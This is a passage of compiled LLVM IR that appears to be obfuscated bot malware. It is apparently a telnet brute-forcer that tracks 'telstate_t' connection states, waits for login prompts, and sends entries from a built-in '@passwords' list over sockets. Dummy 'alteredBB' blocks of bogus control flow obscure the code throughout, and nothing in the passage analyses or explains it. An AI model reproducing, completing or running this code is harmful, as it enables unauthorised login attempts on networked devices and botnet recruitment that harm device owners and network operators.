  %3494 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3493
  %3495 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3494, i32 0, i32 0
  %3496 = load i32, i32* %3495, align 16
  %3497 = load i32, i32* %10, align 4
  %3498 = sext i32 %3497 to i64
  %3499 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3498
  %3500 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3499, i32 0, i32 8
  %3501 = load i8*, i8** %3500, align 8
  %3502 = load i32, i32* %10, align 4
  %3503 = sext i32 %3502 to i64
  %3504 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3503
  %3505 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3504, i32 0, i32 7
  %3506 = load i16, i16* %3505, align 16
  %3507 = zext i16 %3506 to i32
  %3508 = call i32 @readUntil(i32 %3496, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %3501, i32 1024, i32 %3507)
  %3509 = icmp ne i32 %3508, 0
  br label %originalBB125

originalBB129alteredBB:                           ; preds = %originalBB129, %916
  %3510 = load i32, i32* %10, align 4
  %3511 = sext i32 %3510 to i64
  %3512 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3511
  %3513 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3512, i32 0, i32 2
  store i8 5, i8* %3513, align 8
  br label %originalBB129

originalBB133alteredBB:                           ; preds = %originalBB133, %937
  %3514 = load i32, i32* %10, align 4
  %3515 = sext i32 %3514 to i64
  %3516 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3515
  %3517 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3516, i32 0, i32 8
  %3518 = load i8*, i8** %3517, align 8
  call void @llvm.memset.p0i8.i64(i8* %3518, i8 0, i64 1024, i32 1, i1 false)
  br label %originalBB133

originalBB137alteredBB:                           ; preds = %originalBB137, %964
  %3519 = load i32, i32* %10, align 4
  %3520 = sext i32 %3519 to i64
  %3521 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3520
  %3522 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3521, i32 0, i32 8
  %3523 = load i8*, i8** %3522, align 8
  %3524 = call i64 @strlen(i8* %3523) #10
  %3525 = trunc i64 %3524 to i16
  %3526 = load i32, i32* %10, align 4
  %3527 = sext i32 %3526 to i64
  %3528 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3527
  %3529 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3528, i32 0, i32 7
  store i16 %3525, i16* %3529, align 16
  br label %originalBB137

originalBB141alteredBB:                           ; preds = %originalBB141, %993
  br label %originalBB141

originalBB145alteredBB:                           ; preds = %originalBB145, %1012
  %3530 = load i32, i32* %10, align 4
  %3531 = sext i32 %3530 to i64
  %3532 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3531
  %3533 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3532, i32 0, i32 6
  %3534 = load i32, i32* %3533, align 4
  %_146 = shl i32 %3534, 10
  %_147 = sub i32 0, %3534
  %gen148 = add i32 %_147, 10
  %_149 = sub i32 0, %3534
  %gen150 = add i32 %_149, 10
  %_151 = shl i32 %3534, 10
  %_152 = sub i32 0, %3534
  %gen153 = add i32 %_152, 10
  %3535 = add i32 %3534, 10
  %3536 = zext i32 %3535 to i64
  %3537 = call i64 @time(i64* null) #2
  %3538 = icmp slt i64 %3536, %3537
  br label %originalBB145

originalBB157alteredBB:                           ; preds = %originalBB157, %1053
  br label %originalBB157

originalBB161alteredBB:                           ; preds = %originalBB161, %1197
  %3539 = load i32, i32* %10, align 4
  %3540 = sext i32 %3539 to i64
  %3541 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3540
  %3542 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3541, i32 0, i32 8
  %3543 = load i8*, i8** %3542, align 8
  call void @llvm.memset.p0i8.i64(i8* %3543, i8 0, i64 1024, i32 1, i1 false)
  br label %originalBB161

originalBB165alteredBB:                           ; preds = %originalBB165, %1238
  %3544 = load i32, i32* %10, align 4
  %3545 = sext i32 %3544 to i64
  %3546 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3545
  %3547 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3546, i32 0, i32 6
  store i32 0, i32* %3547, align 4
  %3548 = load i32, i32* %10, align 4
  %3549 = sext i32 %3548 to i64
  %3550 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3549
  %3551 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3550, i32 0, i32 7
  store i16 0, i16* %3551, align 16
  %3552 = load i32, i32* %10, align 4
  %3553 = sext i32 %3552 to i64
  %3554 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3553
  %3555 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3554, i32 0, i32 8
  %3556 = load i8*, i8** %3555, align 8
  %3557 = call i8* @strstr(i8* %3556, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i32 0, i32 0)) #10
  %3558 = icmp ne i8* %3557, null
  br label %originalBB165

originalBB169alteredBB:                           ; preds = %originalBB169, %1275
  %3559 = load i32, i32* %10, align 4
  %3560 = sext i32 %3559 to i64
  %3561 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3560
  %3562 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3561, i32 0, i32 2
  store i8 7, i8* %3562, align 8
  br label %originalBB169

originalBB173alteredBB:                           ; preds = %originalBB173, %1371
  %3563 = load i32, i32* %10, align 4
  %3564 = sext i32 %3563 to i64
  %3565 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3564
  %3566 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3565, i32 0, i32 8
  %3567 = load i8*, i8** %3566, align 8
  %3568 = call i8* @strstr(i8* %3567, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i32 0, i32 0)) #10
  %3569 = icmp ne i8* %3568, null
  br label %originalBB173

originalBB177alteredBB:                           ; preds = %originalBB177, %1395
  %3570 = load i32, i32* %10, align 4
  %3571 = sext i32 %3570 to i64
  %3572 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3571
  %3573 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3572, i32 0, i32 0
  %3574 = load i32, i32* %3573, align 16
  %3575 = call i32 @sclose(i32 %3574)
  %3576 = load i32, i32* %10, align 4
  %3577 = sext i32 %3576 to i64
  %3578 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3577
  %3579 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3578, i32 0, i32 2
  store i8 0, i8* %3579, align 8
  %3580 = load i32, i32* %10, align 4
  %3581 = sext i32 %3580 to i64
  %3582 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3581
  %3583 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3582, i32 0, i32 3
  store i8 0, i8* %3583, align 1
  br label %originalBB177

originalBB181alteredBB:                           ; preds = %originalBB181, %1426
  %3584 = load i32, i32* %10, align 4
  %3585 = sext i32 %3584 to i64
  %3586 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3585
  %3587 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3586, i32 0, i32 8
  %3588 = load i8*, i8** %3587, align 8
  %3589 = call i8* @strstr(i8* %3588, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i32 0, i32 0)) #10
  %3590 = icmp ne i8* %3589, null
  br label %originalBB181

originalBB185alteredBB:                           ; preds = %originalBB185, %1496
  %3591 = load i32, i32* %10, align 4
  %3592 = sext i32 %3591 to i64
  %3593 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3592
  %3594 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3593, i32 0, i32 0
  %3595 = load i32, i32* %3594, align 16
  %3596 = call i32 @sclose(i32 %3595)
  %3597 = load i32, i32* %10, align 4
  %3598 = sext i32 %3597 to i64
  %3599 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3598
  %3600 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3599, i32 0, i32 2
  store i8 0, i8* %3600, align 8
  %3601 = load i32, i32* %10, align 4
  %3602 = sext i32 %3601 to i64
  %3603 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3602
  %3604 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3603, i32 0, i32 3
  store i8 0, i8* %3604, align 1
  br label %originalBB185

originalBB189alteredBB:                           ; preds = %originalBB189, %1535
  %3605 = load i32, i32* %10, align 4
  %3606 = sext i32 %3605 to i64
  %3607 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3606
  %3608 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3607, i32 0, i32 0
  %3609 = load i32, i32* %3608, align 16
  %3610 = call i32 @sclose(i32 %3609)
  %3611 = load i32, i32* %10, align 4
  %3612 = sext i32 %3611 to i64
  %3613 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3612
  %3614 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3613, i32 0, i32 2
  store i8 0, i8* %3614, align 8
  %3615 = load i32, i32* %10, align 4
  %3616 = sext i32 %3615 to i64
  %3617 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3616
  %3618 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3617, i32 0, i32 3
  store i8 0, i8* %3618, align 1
  br label %originalBB189

originalBB193alteredBB:                           ; preds = %originalBB193, %1574
  %3619 = load i32, i32* %10, align 4
  %3620 = sext i32 %3619 to i64
  %3621 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3620
  %3622 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3621, i32 0, i32 0
  %3623 = load i32, i32* %3622, align 16
  %3624 = call i32 @sclose(i32 %3623)
  %3625 = load i32, i32* %10, align 4
  %3626 = sext i32 %3625 to i64
  %3627 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3626
  %3628 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3627, i32 0, i32 2
  store i8 0, i8* %3628, align 8
  %3629 = load i32, i32* %10, align 4
  %3630 = sext i32 %3629 to i64
  %3631 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3630
  %3632 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3631, i32 0, i32 3
  store i8 0, i8* %3632, align 1
  br label %originalBB193

originalBB197alteredBB:                           ; preds = %originalBB197, %1643
  %3633 = load i32, i32* %10, align 4
  %3634 = sext i32 %3633 to i64
  %3635 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3634
  %3636 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3635, i32 0, i32 0
  %3637 = load i32, i32* %3636, align 16
  %3638 = load i32, i32* %10, align 4
  %3639 = sext i32 %3638 to i64
  %3640 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3639
  %3641 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3640, i32 0, i32 5
  %3642 = load i8, i8* %3641, align 1
  %3643 = zext i8 %3642 to i64
  %3644 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %3643
  %3645 = load i8*, i8** %3644, align 8
  %3646 = load i32, i32* %10, align 4
  %3647 = sext i32 %3646 to i64
  %3648 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3647
  %3649 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3648, i32 0, i32 5
  %3650 = load i8, i8* %3649, align 1
  %3651 = zext i8 %3650 to i64
  %3652 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %3651
  %3653 = load i8*, i8** %3652, align 8
  %3654 = call i64 @strlen(i8* %3653) #10
  %3655 = call i64 @send(i32 %3637, i8* %3645, i64 %3654, i32 16384)
  %3656 = icmp slt i64 %3655, 0
  br label %originalBB197

originalBB201alteredBB:                           ; preds = %originalBB201, %1707
  %3657 = load i32, i32* %10, align 4
  %3658 = sext i32 %3657 to i64
  %3659 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3658
  %3660 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3659, i32 0, i32 0
  %3661 = load i32, i32* %3660, align 16
  %3662 = call i32 @sclose(i32 %3661)
  %3663 = load i32, i32* %10, align 4
  %3664 = sext i32 %3663 to i64
  %3665 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3664
  %3666 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3665, i32 0, i32 2
  store i8 0, i8* %3666, align 8
  %3667 = load i32, i32* %10, align 4
  %3668 = sext i32 %3667 to i64
  %3669 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3668
  %3670 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3669, i32 0, i32 3
  store i8 1, i8* %3670, align 1
  br label %originalBB201

originalBB205alteredBB:                           ; preds = %originalBB205, %1738
  %3671 = load i32, i32* %10, align 4
  %3672 = sext i32 %3671 to i64
  %3673 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3672
  %3674 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3673, i32 0, i32 2
  store i8 6, i8* %3674, align 8
  br label %originalBB205

originalBB209alteredBB:                           ; preds = %originalBB209, %1759
  %3675 = load i32, i32* %10, align 4
  %3676 = sext i32 %3675 to i64
  %3677 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3676
  %3678 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3677, i32 0, i32 6
  %3679 = load i32, i32* %3678, align 4
  %3680 = icmp eq i32 %3679, 0
  br label %originalBB209

originalBB213alteredBB:                           ; preds = %originalBB213, %1789
  %3681 = load i32, i32* %10, align 4
  %3682 = sext i32 %3681 to i64
  %3683 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3682
  %3684 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3683, i32 0, i32 0
  %3685 = load i32, i32* %3684, align 16
  %3686 = load i32, i32* %10, align 4
  %3687 = sext i32 %3686 to i64
  %3688 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3687
  %3689 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3688, i32 0, i32 8
  %3690 = load i8*, i8** %3689, align 8
  %3691 = load i32, i32* %10, align 4
  %3692 = sext i32 %3691 to i64
  %3693 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3692
  %3694 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3693, i32 0, i32 7
  %3695 = load i16, i16* %3694, align 16
  %3696 = zext i16 %3695 to i32
  %3697 = call i32 @readUntil(i32 %3685, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.63, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %3690, i32 1024, i32 %3696)
  %3698 = icmp ne i32 %3697, 0
  br label %originalBB213

originalBB217alteredBB:                           ; preds = %originalBB217, %1840
  %3699 = load i32, i32* %10, align 4
  %3700 = sext i32 %3699 to i64
  %3701 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3700
  %3702 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3701, i32 0, i32 8
  %3703 = load i8*, i8** %3702, align 8
  call void @llvm.memset.p0i8.i64(i8* %3703, i8 0, i64 1024, i32 1, i1 false)
  %3704 = load i32, i32* %10, align 4
  %3705 = sext i32 %3704 to i64
  %3706 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3705
  %3707 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3706, i32 0, i32 0
  %3708 = load i32, i32* %3707, align 16
  %3709 = call i32 @sclose(i32 %3708)
  %3710 = load i32, i32* %10, align 4
  %3711 = sext i32 %3710 to i64
  %3712 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3711
  %3713 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3712, i32 0, i32 2
  store i8 0, i8* %3713, align 8
  %3714 = load i32, i32* %10, align 4
  %3715 = sext i32 %3714 to i64
  %3716 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3715
  %3717 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3716, i32 0, i32 3
  store i8 0, i8* %3717, align 1
  br label %originalBB217

originalBB221alteredBB:                           ; preds = %originalBB221, %1909
  %3718 = load i32, i32* %10, align 4
  %3719 = sext i32 %3718 to i64
  %3720 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3719
  %3721 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3720, i32 0, i32 8
  %3722 = load i8*, i8** %3721, align 8
  call void @llvm.memset.p0i8.i64(i8* %3722, i8 0, i64 1024, i32 1, i1 false)
  br label %originalBB221

originalBB225alteredBB:                           ; preds = %originalBB225, %1950
  %3723 = load i32, i32* %10, align 4
  %3724 = sext i32 %3723 to i64
  %3725 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3724
  %3726 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3725, i32 0, i32 6
  store i32 0, i32* %3726, align 4
  %3727 = load i32, i32* %10, align 4
  %3728 = sext i32 %3727 to i64
  %3729 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3728
  %3730 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3729, i32 0, i32 7
  store i16 0, i16* %3730, align 16
  %3731 = load i32, i32* %10, align 4
  %3732 = sext i32 %3731 to i64
  %3733 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3732
  %3734 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3733, i32 0, i32 8
  %3735 = load i8*, i8** %3734, align 8
  %3736 = call i8* @strstr(i8* %3735, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.64, i32 0, i32 0)) #10
  %3737 = icmp ne i8* %3736, null
  br label %originalBB225

originalBB229alteredBB:                           ; preds = %originalBB229, %1982
  %3738 = load i32, i32* %10, align 4
  %3739 = sext i32 %3738 to i64
  %3740 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3739
  %3741 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3740, i32 0, i32 8
  %3742 = load i8*, i8** %3741, align 8
  call void @llvm.memset.p0i8.i64(i8* %3742, i8 0, i64 1024, i32 1, i1 false)
  %3743 = load i32, i32* %10, align 4
  %3744 = sext i32 %3743 to i64
  %3745 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3744
  %3746 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3745, i32 0, i32 0
  %3747 = load i32, i32* %3746, align 16
  %3748 = call i32 @sclose(i32 %3747)
  %3749 = load i32, i32* %10, align 4
  %3750 = sext i32 %3749 to i64
  %3751 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3750
  %3752 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3751, i32 0, i32 2
  store i8 0, i8* %3752, align 8
  %3753 = load i32, i32* %10, align 4
  %3754 = sext i32 %3753 to i64
  %3755 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3754
  %3756 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3755, i32 0, i32 3
  store i8 0, i8* %3756, align 1
  br label %originalBB229

originalBB233alteredBB:                           ; preds = %originalBB233, %2018
  %3757 = load i32, i32* %10, align 4
  %3758 = sext i32 %3757 to i64
  %3759 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3758
  %3760 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3759, i32 0, i32 8
  %3761 = load i8*, i8** %3760, align 8
  %3762 = call i32 @matchPrompt(i8* %3761)
  %3763 = icmp ne i32 %3762, 0
  br label %originalBB233

originalBB237alteredBB:                           ; preds = %originalBB237, %2042
  %3764 = load i32, i32* %10, align 4
  %3765 = sext i32 %3764 to i64
  %3766 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3765
  %3767 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3766, i32 0, i32 8
  %3768 = load i8*, i8** %3767, align 8
  call void @llvm.memset.p0i8.i64(i8* %3768, i8 0, i64 1024, i32 1, i1 false)
  %3769 = load i32, i32* %10, align 4
  %3770 = sext i32 %3769 to i64
  %3771 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3770
  %3772 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3771, i32 0, i32 0
  %3773 = load i32, i32* %3772, align 16
  %3774 = call i32 @sclose(i32 %3773)
  %3775 = load i32, i32* %10, align 4
  %3776 = sext i32 %3775 to i64
  %3777 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3776
  %3778 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3777, i32 0, i32 2
  store i8 0, i8* %3778, align 8
  %3779 = load i32, i32* %10, align 4
  %3780 = sext i32 %3779 to i64
  %3781 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3780
  %3782 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3781, i32 0, i32 3
  store i8 1, i8* %3782, align 1
  br label %originalBB237

originalBB241alteredBB:                           ; preds = %originalBB241, %2078
  %3783 = load i32, i32* %10, align 4
  %3784 = sext i32 %3783 to i64
  %3785 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3784
  %3786 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3785, i32 0, i32 2
  store i8 7, i8* %3786, align 8
  br label %originalBB241

originalBB245alteredBB:                           ; preds = %originalBB245, %2099
  %3787 = load i32, i32* %10, align 4
  %3788 = sext i32 %3787 to i64
  %3789 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3788
  %3790 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3789, i32 0, i32 8
  %3791 = load i8*, i8** %3790, align 8
  call void @llvm.memset.p0i8.i64(i8* %3791, i8 0, i64 1024, i32 1, i1 false)
  br label %originalBB245

originalBB249alteredBB:                           ; preds = %originalBB249, %2156
  %3792 = load i32, i32* %10, align 4
  %3793 = sext i32 %3792 to i64
  %3794 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3793
  %3795 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3794, i32 0, i32 8
  %3796 = load i8*, i8** %3795, align 8
  call void @llvm.memset.p0i8.i64(i8* %3796, i8 0, i64 1024, i32 1, i1 false)
  %3797 = load i32, i32* %10, align 4
  %3798 = sext i32 %3797 to i64
  %3799 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3798
  %3800 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3799, i32 0, i32 0
  %3801 = load i32, i32* %3800, align 16
  %3802 = call i32 @sclose(i32 %3801)
  %3803 = load i32, i32* %10, align 4
  %3804 = sext i32 %3803 to i64
  %3805 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3804
  %3806 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3805, i32 0, i32 2
  store i8 0, i8* %3806, align 8
  %3807 = load i32, i32* %10, align 4
  %3808 = sext i32 %3807 to i64
  %3809 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3808
  %3810 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3809, i32 0, i32 3
  store i8 0, i8* %3810, align 1
  br label %originalBB249

originalBB253alteredBB:                           ; preds = %originalBB253, %2222
  %3811 = load i32, i32* %10, align 4
  %3812 = sext i32 %3811 to i64
  %3813 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3812
  %3814 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3813, i32 0, i32 6
  store i32 0, i32* %3814, align 4
  %3815 = load i32, i32* %10, align 4
  %3816 = sext i32 %3815 to i64
  %3817 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3816
  %3818 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3817, i32 0, i32 7
  store i16 0, i16* %3818, align 16
  %3819 = load i32, i32* %10, align 4
  %3820 = sext i32 %3819 to i64
  %3821 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3820
  %3822 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3821, i32 0, i32 8
  %3823 = load i8*, i8** %3822, align 8
  %3824 = call i8* @strstr(i8* %3823, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i32 0, i32 0)) #10
  %3825 = icmp ne i8* %3824, null
  br label %originalBB253

originalBB257alteredBB:                           ; preds = %originalBB257, %2304
  %3826 = load i32, i32* %10, align 4
  %3827 = sext i32 %3826 to i64
  %3828 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3827
  %3829 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3828, i32 0, i32 6
  store i32 0, i32* %3829, align 4
  %3830 = load i32, i32* %10, align 4
  %3831 = sext i32 %3830 to i64
  %3832 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3831
  %3833 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3832, i32 0, i32 7
  store i16 0, i16* %3833, align 16
  %3834 = load i32, i32* %10, align 4
  %3835 = sext i32 %3834 to i64
  %3836 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3835
  %3837 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3836, i32 0, i32 8
  %3838 = load i8*, i8** %3837, align 8
  %3839 = call i8* @strstr(i8* %3838, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i32 0, i32 0)) #10
  %3840 = icmp ne i8* %3839, null
  br label %originalBB257

originalBB261alteredBB:                           ; preds = %originalBB261, %2356
  %3841 = load i32, i32* %10, align 4
  %3842 = sext i32 %3841 to i64
  %3843 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3842
  %3844 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3843, i32 0, i32 2
  store i8 7, i8* %3844, align 8
  br label %originalBB261

originalBB265alteredBB:                           ; preds = %originalBB265, %2377
  %3845 = load i32, i32* %10, align 4
  %3846 = sext i32 %3845 to i64
  %3847 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3846
  %3848 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3847, i32 0, i32 8
  %3849 = load i8*, i8** %3848, align 8
  call void @llvm.memset.p0i8.i64(i8* %3849, i8 0, i64 1024, i32 1, i1 false)
  br label %originalBB265

originalBB269alteredBB:                           ; preds = %originalBB269, %2418
  %3850 = load i32, i32* %10, align 4
  %3851 = sext i32 %3850 to i64
  %3852 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3851
  %3853 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3852, i32 0, i32 6
  store i32 0, i32* %3853, align 4
  %3854 = load i32, i32* %10, align 4
  %3855 = sext i32 %3854 to i64
  %3856 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3855
  %3857 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3856, i32 0, i32 7
  store i16 0, i16* %3857, align 16
  %3858 = load i32, i32* %10, align 4
  %3859 = sext i32 %3858 to i64
  %3860 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3859
  %3861 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3860, i32 0, i32 8
  %3862 = load i8*, i8** %3861, align 8
  %3863 = call i8* @strstr(i8* %3862, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i32 0, i32 0)) #10
  %3864 = icmp ne i8* %3863, null
  br label %originalBB269

originalBB273alteredBB:                           ; preds = %originalBB273, %2450
  %3865 = load i32, i32* %10, align 4
  %3866 = sext i32 %3865 to i64
  %3867 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3866
  %3868 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3867, i32 0, i32 8
  %3869 = load i8*, i8** %3868, align 8
  call void @llvm.memset.p0i8.i64(i8* %3869, i8 0, i64 1024, i32 1, i1 false)
  %3870 = load i32, i32* %10, align 4
  %3871 = sext i32 %3870 to i64
  %3872 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3871
  %3873 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3872, i32 0, i32 0
  %3874 = load i32, i32* %3873, align 16
  %3875 = call i32 @sclose(i32 %3874)
  %3876 = load i32, i32* %10, align 4
  %3877 = sext i32 %3876 to i64
  %3878 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %3877
  %3879 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3878, i32 0, i32 2
